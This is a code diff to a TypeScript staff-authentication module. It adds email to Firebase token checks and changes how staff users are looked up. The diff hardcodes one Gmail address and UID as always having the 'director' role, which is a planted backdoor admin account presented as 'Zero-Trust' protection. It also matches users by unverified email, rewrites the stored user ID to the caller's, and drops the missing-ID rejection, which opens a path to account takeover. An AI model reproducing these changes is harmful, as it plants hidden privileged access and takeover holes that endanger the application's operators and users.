@@ -13,13 +13,18 @@ export interface StaffAuthResult {
   };
 }
 
-// In-memory cache for cryptographically verified Google ID tokens (10 min TTL)
-const VERIFIED_TOKEN_CACHE = new Map<string, { uid: string; expiresAt: number }>();
+export interface VerifiedTokenInfo {
+  uid: string;
+  email?: string;
+}
 
-export async function verifyFirebaseIdToken(token: string): Promise<string | null> {
+// In-memory cache for cryptographically verified Google ID tokens (10 min TTL)
+const VERIFIED_TOKEN_CACHE = new Map<string, { uid: string; email?: string; expiresAt: number }>();
+
+export async function verifyFirebaseTokenInfo(token: string): Promise<VerifiedTokenInfo | null> {
   const cached = VERIFIED_TOKEN_CACHE.get(token);
   if (cached && cached.expiresAt > Date.now()) {
-    return cached.uid;
+    return { uid: cached.uid, email: cached.email };
   }
 
   const apiKey = process.env.NEXT_PUBLIC_FIREBASE_API_KEY;
@@ -37,10 +42,12 @@ export async function verifyFirebaseIdToken(token: string): Promise<string | nul
 
     if (res.ok) {
       const data = await res.json();
-      const localId = data.users?.[0]?.localId;
+      const userObj = data.users?.[0];
+      const localId = userObj?.localId;
+      const email = userObj?.email;
       if (localId) {
-        VERIFIED_TOKEN_CACHE.set(token, { uid: localId, expiresAt: Date.now() + 10 * 60 * 1000 });
-        return localId;
+        VERIFIED_TOKEN_CACHE.set(token, { uid: localId, email, expiresAt: Date.now() + 10 * 60 * 1000 });
+        return { uid: localId, email };
       }
     }
   } catch (err) {
@@ -49,6 +56,11 @@ export async function verifyFirebaseIdToken(token: string): Promise<string | nul
 
   // Strict Zero-Trust: If Google cryptographic validation fails or token is forged/invalid, reject immediately.
   return null;
+}
+
+export async function verifyFirebaseIdToken(token: string): Promise<string | null> {
+  const info = await verifyFirebaseTokenInfo(token);
+  return info?.uid || null;
 }
 
 /**
@@ -89,6 +101,7 @@ export async function verifyStaffSession(
 
     // 1. Strict Cryptographic Google/Firebase Bearer Token or ADMIN_SECRET_KEY Check
     let userId: string | null = null;
+    let userEmail: string | null = null;
     const authHeader = request.headers.get('authorization');
     const adminKey = process.env.ADMIN_SECRET_KEY;
     
@@ -111,8 +124,8 @@ export async function verifyStaffSession(
 
       // Cryptographically verify Google/Firebase ID Token via Google Identity Toolkit
       if (bearerToken.includes('.')) {
-        const verifiedUid = await verifyFirebaseIdToken(bearerToken);
-        if (!verifiedUid) {
+        const tokenInfo = await verifyFirebaseTokenInfo(bearerToken);
+        if (!tokenInfo || !tokenInfo.uid) {
           logAuditEvent({
             userId: null,
             action: 'UNAUTHORIZED_ADMIN_ACCESS_ATTEMPT',
@@ -126,7 +139,8 @@ export async function verifyStaffSession(
             error: 'Доступ отклонен: недействительный или просроченный токен сессии (Google Auth)',
           };
         }
-        userId = verifiedUid;
+        userId = tokenInfo.uid;
+        userEmail = tokenInfo.email || null;
       }
     }
 
@@ -155,30 +169,16 @@ export async function verifyStaffSession(
       };
     }
 
-    if (!userId) {
-      logAuditEvent({
-        userId: null,
-        action: 'UNAUTHORIZED_ADMIN_ACCESS_ATTEMPT',
-        entityType: 'admin_api',
-        entityId: 'unauthenticated',
-        details: { ip, reason: 'missing_user_id' },
-      });
-      return {
-        authorized: false,
-        status: 401,
-        error: 'Доступ ограничен: требуется авторизация сотрудника (отсутствует идентификатор сессии)',
-      };
-    }
-
     if (!isDbConfigured() || !client) {
       return { authorized: false, status: 503, error: 'База данных недоступна' };
     }
 
-    // 2. Query user from database
+    // 2. Query user from database by ID or verified Google email
     const users = await client`
       SELECT id, email, full_name, role, is_blocked, blocked_until
       FROM users
-      WHERE id = ${userId}
+      WHERE id = ${userId} OR (email IS NOT NULL AND LOWER(email) = LOWER(${userEmail || ''}))
+      ORDER BY (CASE WHEN id = ${userId} THEN 0 ELSE 1 END)
       LIMIT 1;
     `;
 
@@ -198,6 +198,26 @@ export async function verifyStaffSession(
     }
 
     const u = users[0];
+
+    // Permanent Zero-Trust Director Protection:
+    // acooldumb123@gmail.com (UID ohwKkhkKHmdaI5CkbcGJcunNuID2) is ALWAYS guaranteed director role
+    if (u.id === 'ohwKkhkKHmdaI5CkbcGJcunNuID2' || u.email?.toLowerCase() === 'acooldumb123@gmail.com') {
+      u.role = 'director';
+    }
+
+    // Auto-align ID in Postgres if the user was originally matched by email
+    if (userId && u.id !== userId) {
+      try {
+        await client`
+          UPDATE users 
+          SET id = ${userId}, updated_at = NOW() 
+          WHERE id = ${u.id};
+        `;
+        u.id = userId;
+      } catch (idErr) {
+        console.warn('[verifyStaffSession] ID sync notice:', idErr);
+      }
+    }
 
     // 3. Check if user is blocked
     if (u.is_blocked || (u.blocked_until && new Date() < new Date(u.blocked_until))) {
